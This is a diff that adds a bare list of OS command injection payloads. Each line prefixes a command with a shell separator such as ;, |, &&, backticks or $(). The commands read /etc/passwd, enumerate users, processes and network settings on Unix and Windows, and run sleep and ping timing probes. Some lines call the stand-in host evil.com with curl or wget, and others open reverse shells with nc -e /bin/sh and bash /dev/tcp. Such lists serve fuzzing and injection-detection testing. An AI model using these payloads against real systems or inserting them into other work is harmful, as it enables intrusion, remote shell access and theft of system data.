@@ -1,0 +1,32 @@
+; cat /etc/passwd
+| whoami
+&& id
+`uname -a`
+$(whoami)
+; ls -la
+| ps aux
+&& netstat -an
+; sleep 5
+| ping -c 4 127.0.0.1
+&& curl http://evil.com
+; wget http://evil.com
+| nc -e /bin/sh 127.0.0.1 4444
+&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; python -c "import os; os.system('id')"
+| perl -e "system('id')"
+&& ruby -e "system('id')"
+; php -r "system('id');"
+| node -e "require('child_process').exec('id')"
+&& powershell -c "Get-Process"
+; cmd /c dir
+| type C:\Windows\System32\drivers\etc\hosts
+&& whoami
+; net user
+| ipconfig /all
+&& systeminfo
+; tasklist
+| netstat -an
+&& timeout 5
+; ping -n 4 127.0.0.1
+| dir C:\
+&& echo %USERNAME%
